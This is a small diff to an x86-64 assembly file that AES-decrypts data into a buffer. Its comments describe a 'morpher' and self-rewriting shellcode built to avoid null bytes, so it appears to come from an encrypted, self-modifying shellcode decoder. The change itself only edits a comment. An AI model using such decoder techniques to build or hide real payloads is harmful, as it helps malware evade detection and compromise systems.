@@ -174,7 +174,7 @@ aesdeclast %xmm5,  %xmm0
 # move it after already written 16 bytes, using RBX, so we are not limited by the length (16 will be constant, so no zeroes)
 add $16, %rbx
 movaps %xmm0, (%rbx)
-# however, in the morpher we will use RDX since, it contains the buffer's address
+# however, in the morpher we will use RDX since, it contains the buffer's address, thereby the shellcode will rewrite it-self
 # add $16, %rdx
 # movaps %xmm0, (%rdx)
 # "Release The Kraken!" I mean, shellcode
